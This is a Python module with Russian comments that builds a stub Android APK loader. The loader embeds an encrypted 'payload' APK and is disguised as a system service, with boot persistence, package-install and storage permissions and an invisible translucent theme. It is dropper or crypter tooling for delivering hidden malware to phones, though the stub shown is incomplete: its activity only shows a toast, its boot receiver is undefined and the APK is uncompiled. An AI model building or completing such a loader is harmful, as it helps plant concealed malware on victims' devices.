import logging
import os
import shutil
import zipfile
import secrets
import base64
from pathlib import Path
from typing import Dict, Optional, Tuple

logger = logging.getLogger(__name__)


class StubBuilder:
    """
    StubBuilder — создаёт stub APK-загрузчик.
    Stub — это минимальный APK который при запуске расшифровывает
    и загружает зашифрованный payload APK.
    """

    STUB_MANIFEST_TEMPLATE = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{package_name}">

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>

    <application
        android:allowBackup="false"
        android:label="{app_label}"
        android:theme="@android:style/Theme.Translucent.NoTitleBar">

        <activity android:name=".StubActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <receiver
            android:name=".BootReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
"""

    STUB_ACTIVITY_SMALI = """.class public Lcom/stub/loader/StubActivity;
.super Landroid/app/Activity;

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2
    invoke-direct {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    const-string v0, "Loading..."
    const/4 v1, 0x0
    invoke-static {{p0, v0, v1}}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
    move-result-object v0
    invoke-virtual {{v0}}, Landroid/widget/Toast;->show()V
    invoke-virtual {{p0}}, Landroid/app/Activity;->finish()V
    return-void
.end method
"""

    def __init__(self, output_dir: str = "output", temp_dir: str = "temp/stub_build"):
        self.output_dir = Path(output_dir)
        self.temp_dir = Path(temp_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.temp_dir.mkdir(parents=True, exist_ok=True)
        logger.info("StubBuilder initialized")

    def build_stub(
        self,
        payload_path: str,
        package_name: str = "com.system.core.service",
        app_label: str = "System Service",
        output_name: Optional[str] = None,
    ) -> str:
        """
        Создаёт stub APK с встроенным зашифрованным payload.

        Args:
            payload_path: Путь к (уже зашифрованному) payload APK
            package_name: Имя пакета для stub
            app_label: Название приложения
            output_name: Имя выходного APK (опционально)

        Returns:
            Путь к stub APK
        """
        payload_path = Path(payload_path)
        if not payload_path.exists():
            raise FileNotFoundError(f"Payload не найден: {payload_path}")

        build_id = secrets.token_hex(4)
        work_dir = self.temp_dir / f"build_{build_id}"
        work_dir.mkdir(parents=True, exist_ok=True)

        try:
            # Создаём структуру stub APK
            apk_dirs = ["META-INF", "smali/com/stub/loader", "assets", "res/values"]
            for d in apk_dirs:
                (work_dir / d).mkdir(parents=True, exist_ok=True)

            # AndroidManifest.xml
            manifest = self.STUB_MANIFEST_TEMPLATE.format(
                package_name=package_name, app_label=app_label
            )
            (work_dir / "AndroidManifest.xml").write_text(manifest, encoding="utf-8")

            # Smali activity
            (work_dir / "smali/com/stub/loader/StubActivity.smali").write_text(
                self.STUB_ACTIVITY_SMALI, encoding="utf-8"
            )

            # Встраиваем payload как assets/payload.bin
            shutil.copy(payload_path, work_dir / "assets" / "payload.bin")

            # Записываем ключ расшифровки (для реального устройства нужен отдельный механизм)
            key_info = {
                "package": package_name,
                "build_id": build_id,
                "payload": "assets/payload.bin",
            }
            (work_dir / "assets" / "config.dat").write_bytes(
                base64.b64encode(str(key_info).encode())
            )

            # Собираем APK (zip)
            output_name = output_name or f"stub_{build_id}.apk"
            output_path = self.output_dir / output_name

            with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for file in work_dir.rglob("*"):
                    if file.is_file():
                        zf.write(file, file.relative_to(work_dir))

            size_kb = output_path.stat().st_size // 1024
            logger.info(f"Stub APK создан: {output_path} ({size_kb} KB)")
            return str(output_path)

        finally:
            shutil.rmtree(work_dir, ignore_errors=True)

    def get_stub_info(self, stub_path: str) -> Dict:
        """Возвращает информацию о stub APK"""
        stub_path = Path(stub_path)
        if not stub_path.exists():
            return {"error": "Файл не найден"}

        info = {
            "name": stub_path.name,
            "size": stub_path.stat().st_size,
        }

        try:
            with zipfile.ZipFile(stub_path, "r") as z:
                info["files"] = z.namelist()
                info["has_manifest"] = "AndroidManifest.xml" in z.namelist()
                info["has_payload"] = "assets/payload.bin" in z.namelist()
        except Exception as e:
            info["error"] = str(e)

        return info
